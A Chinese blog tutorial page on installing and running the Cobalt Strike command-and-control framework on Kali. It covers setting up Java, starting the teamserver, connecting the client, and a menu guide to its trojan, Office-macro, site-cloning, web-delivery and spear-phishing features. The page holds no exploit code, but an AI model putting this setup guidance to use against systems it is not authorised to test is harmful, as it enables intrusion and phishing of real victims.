@@ -1,0 +1,884 @@
+<script type="text/javascript" src="../../source/js/love.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>CobaltStrike安装及详细使用 | wolke</title><meta name="keywords" content="CobaltStrike,内网渗透"><meta name="author" content="w01ke"><meta name="copyright" content="w01ke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、CobaltStrike简介CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。   CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CobaltStrike安装及详细使用">
+<meta property="og:url" content="https://wolke.cn/post/57d03e3e.html">
+<meta property="og:site_name" content="wolke">
+<meta property="og:description" content="一、CobaltStrike简介CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。   CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/icon.jpg">
+<meta property="article:published_time" content="2022-02-16T17:26:19.000Z">
+<meta property="article:modified_time" content="2022-02-16T17:32:18.651Z">
+<meta property="article:author" content="w01ke">
+<meta property="article:tag" content="CobaltStrike">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/icon.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://wolke.cn/post/57d03e3e"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?9b5e9e86a0a422ec787d72998e8fdbff";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-Q0YHC68NHX"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-Q0YHC68NHX');
+</script><link rel="stylesheet" href="/wolke" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: w01ke","link":"链接: ","source":"来源: wolke","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'CobaltStrike安装及详细使用',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-17 01:32:18'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><script src="/live2d-widget/autoload.js"></script><script src="/live2d-widget/autoload.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">47</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">36</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/black.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wolke</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">CobaltStrike安装及详细使用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-16T17:26:19.000Z" title="发表于 2022-02-17 01:26:19">2022-02-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-16T17:32:18.651Z" title="更新于 2022-02-17 01:32:18">2022-02-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">安全工具/安全开发</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>23分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="CobaltStrike安装及详细使用"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、CobaltStrike简介"><a href="#一、CobaltStrike简介" class="headerlink" title="一、CobaltStrike简介"></a>一、CobaltStrike简介</h1><p>CobaltStrike是一款渗透测试神器，被业界人称为CS神器。CobaltStrike分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。  </p>
+<p>CobaltStrike集成了端口转发、服务扫描，自动化溢出，多模式端口监听，windows exe 木马生成，windows dll 木马生成，java 木马生成，office 宏病毒生成，木马捆绑。钓鱼攻击包括：站点克隆，目标信息获取，java 执行，浏览器自动攻击等等强大的功能！</p>
+<p>Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。</p>
+<p>Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。</p>
+<h1 id="二、CobaltStrike的安装和启动"><a href="#二、CobaltStrike的安装和启动" class="headerlink" title="二、CobaltStrike的安装和启动"></a>二、CobaltStrike的安装和启动</h1><p>我这里以Kali为例</p>
+<h2 id="1、安装java环境"><a href="#1、安装java环境" class="headerlink" title="1、安装java环境"></a>1、安装java环境</h2><p>这里我用的是jdk-8u191-linux-x64.tar.gz，下载链接参照：<a target="_blank" rel="noopener" href="https://blog.csdn.net/DeweyLau/article/details/109636906">https://blog.csdn.net/DeweyLau/article/details/109636906</a></p>
+<p>注意：java并不是必须要安装到opt目录下，读者可以自行选择</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">上传到Kali中，解压：tar -xzvf jdk-8u191-linux-x64.tar.gz</span><br><span class="line">移动到opt目录下： mv jdk1.8.0_191/ /opt/</span><br><span class="line">进入jdk目录：<span class="built_in">cd</span>  /opt/jdk1.8.0_191</span><br><span class="line"></span><br><span class="line">执行 vim  ~/.bashrc  并添加下列内容</span><br><span class="line"><span class="comment"># install JAVA JDK</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_191</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="variable">$PATH</span></span><br><span class="line">保存退出</span><br><span class="line">执行: <span class="built_in">source</span> ~/.bashrc</span><br><span class="line"></span><br><span class="line">执行：</span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_191/bin/java 1</span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_191/bin/javac 1</span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_191/bin/java</span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_191/bin/javac</span><br><span class="line"></span><br><span class="line">查看结果：</span><br><span class="line">update-alternatives --config java</span><br><span class="line">update-alternatives --config javac</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636273734393-8ab0b8dd-b062-4051-bb56-b2b6abf25dd2.png" alt="img"></p>
+<p>出现上图情况说明安装成功</p>
+<h2 id="2、安装CobalStrike"><a href="#2、安装CobalStrike" class="headerlink" title="2、安装CobalStrike"></a>2、安装CobalStrike</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">上传到Kali中，解压：unzip cobaltstrike-linux.zip</span><br><span class="line">进入cobalstrike中：<span class="built_in">cd</span> cobaltstrike-linux/</span><br></pre></td></tr></table></figure>
+
+<p>一般Cobalt Strike目录结构如下：</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274707738-d661a408-8728-4e2f-8127-3a133a2c2cc1.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] agscript                         拓展应用的脚本</span><br><span class="line">[+] c2lint                           用于检查profile的错误异常</span><br><span class="line">[+] teamserver                       服务端程序</span><br><span class="line">[+] cobaltstrike，cobaltstrike.jar   客户端程序(java跨平台)</span><br><span class="line">[+] license.pdf                      许可证文件</span><br><span class="line">[+] logs                             目录记录与目标主机的相关信息 </span><br><span class="line">[+] update，update.jar               用于更新CS </span><br><span class="line">[+] third-party                      第三方工具</span><br></pre></td></tr></table></figure>
+
+<p>将安装目录解压进入目录后，可以给所有文件赋予777权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 ./*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636273860708-34edee99-951c-47ca-9dde-b982a6e523a5.png" alt="img"></p>
+<h2 id="3、启动服务端"><a href="#3、启动服务端" class="headerlink" title="3、启动服务端"></a>3、启动服务端</h2><p>团队服务器最好运行在Linux平台上，服务端的关键文件是teamserver和cobaltstrike.jar，将这两个文件放在同一目录下运行：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line">&lt;host&gt; 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; 必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD] 可选参数 所有payload的终止时间</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动Team Server</span></span><br><span class="line">sudo ./teamserver [当前开启服务端设备的IP地址] [客户端登录密码] <span class="comment"># 设置强密码，否则容易被爆破，参考附录</span></span><br></pre></td></tr></table></figure>
+
+<p>比如这里我的Kali是部署在内网的，IP地址是192.168.1.104，设置客户端的登录密码为123456</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.1.104 123456</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274175735-2e1951f2-0854-4e12-8a46-aa8f343671f7.png" alt="img"></p>
+<p>PS：团队服务器默认连接端口为50050，如果你想修改端口只需修改teamserver文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274837524-f2e2dac5-995a-4345-bf82-6364e1d566bd.png" alt="img"></p>
+<p>如果运行上述命令出现以下报错信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[-] keytool is not <span class="keyword">in</span> <span class="variable">$PATH</span></span><br><span class="line">    install the Java Developer Kit</span><br></pre></td></tr></table></figure>
+
+<p>明明java已经安装好了，但是一直报错，于是马上检查 keytool 路径，突然发现 keytool 指向的路径是错误的，于是重新配置了一波路径，成功解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /opt/jdk1.8.0_191/bin/keytool /usr/bin/</span><br></pre></td></tr></table></figure>
+
+<p>确定 java 路径，我的是 <code>/opt/jdk1.8.0_191/bin/keytool</code> 于是用上面的命令创建一条软链接。  </p>
+<p>注意：如果安装java时跟我安装的不同，上面的路径改成你们当时安装的路径即可</p>
+<p>如果提示已存在，可以用 <code>rm -rf ./keytool</code> 命令删除重建</p>
+<h2 id="4、客户端连接"><a href="#4、客户端连接" class="headerlink" title="4、客户端连接"></a>4、客户端连接</h2><p>Linux：<code>**./cobaltstrike**</code>或<code>**java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar**</code></p>
+<p>Windows：双击<code>**cobaltstrike.exe**</code></p>
+<p>输入服务端IP，端口默认50050，用户名任意，密码为之前设置的密码，点击connect。第一次连接会出现hash校验，这里的hash等于前面的启动teamserver时的hash，直接点击“是”即可连接到团队服务器上。  </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636277688426-711e26a5-4291-4f4f-92ee-c5ea598aa10b.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636274529055-616a0c26-1a26-4eb9-85ee-734256f9c358.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1636275070728-4789f985-3bc5-42a8-8a93-12ffb94aec3e.png" alt="img"></p>
+<h1 id="三、参数详解"><a href="#三、参数详解" class="headerlink" title="三、参数详解"></a>三、参数详解</h1><h2 id="1、Cobalt-Strike"><a href="#1、Cobalt-Strike" class="headerlink" title="1、Cobalt Strike"></a>1、Cobalt Strike</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] New Connection   <span class="comment"># 新建连接，支持连接多个服务器端</span></span><br><span class="line">[+] Preferences   <span class="comment"># 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</span></span><br><span class="line">[+] Visualization   <span class="comment"># 主要展示输出结果的视图</span></span><br><span class="line">[+] VPN Interfaces   <span class="comment"># 设置VPN接口</span></span><br><span class="line">[+] Listenrs   <span class="comment"># 创建监听器</span></span><br><span class="line">[+] Script Manager   <span class="comment"># 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</span></span><br><span class="line">[+] Close   <span class="comment"># 退出连接</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2、View"><a href="#2、View" class="headerlink" title="2、View"></a>2、View</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+] Applications   <span class="comment"># 显示受害主机的应用信息</span></span><br><span class="line">[+] Credentials   <span class="comment"># 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</span></span><br><span class="line">[+] Downloads   <span class="comment"># 查看已下载文件</span></span><br><span class="line">[+] Event Log   <span class="comment"># 主机上线记录以及团队协作聊天记录</span></span><br><span class="line">[+] Keystrokes   <span class="comment"># 查看键盘记录结果</span></span><br><span class="line">[+] Proxy Pivots   <span class="comment"># 查看代理模块</span></span><br><span class="line">[+] Screenshots   <span class="comment"># 查看所有屏幕截图</span></span><br><span class="line">[+] Script Console   <span class="comment"># 加载第三方脚本以增强功能 </span></span><br><span class="line">[+] Targets   <span class="comment"># 显示所有受害主机</span></span><br><span class="line">[+] Web Log    <span class="comment"># 所有Web服务的日志</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="3、Attacks"><a href="#3、Attacks" class="headerlink" title="3、Attacks"></a>3、Attacks</h2><h3 id="（1）Packages"><a href="#（1）Packages" class="headerlink" title="（1）Packages"></a>（1）Packages</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] HTML Application   <span class="comment"># 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</span></span><br><span class="line">[+] MS Office Macro   <span class="comment"># 生成office宏病毒文件</span></span><br><span class="line">[+] Payload Generator   <span class="comment"># 生成各种语言版本的payload</span></span><br><span class="line">[+] USB/CD AutoPlay   <span class="comment"># 生成利用自动播放运行的木马文件</span></span><br><span class="line">[+] Windows Dropper   <span class="comment"># 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</span></span><br><span class="line">[+] Windows Executable   <span class="comment"># 生成可执行exe木马</span></span><br><span class="line">[+] Windows Executable(Stageless)   <span class="comment"># 生成无状态的可执行exe木马</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="（2）Web-Drive-by"><a href="#（2）Web-Drive-by" class="headerlink" title="（2）Web Drive-by"></a>（2）Web Drive-by</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[+] Manage   <span class="comment"># 对开启的web服务进行管理</span></span><br><span class="line">[+] Clone Site   <span class="comment"># 克隆网站，可以记录受害者提交的数据</span></span><br><span class="line">[+] Host File   <span class="comment"># 提供文件下载，可以选择Mime类型</span></span><br><span class="line">[+] Scripted Web Delivery   <span class="comment"># 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </span></span><br><span class="line">[+] Signed Applet Attack   <span class="comment"># 使用java自签名的程序进行钓鱼攻击(该方法已过时)</span></span><br><span class="line">[+] Smart Applet Attack   <span class="comment"># 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)</span></span><br><span class="line">[+] System Profiler   <span class="comment"># 用来获取系统信息，如系统版本，Flash版本，浏览器版本等</span></span><br><span class="line">[+] Spear Phish   <span class="comment"># 鱼叉钓鱼邮件</span></span><br></pre></td></tr></table></figure>
+
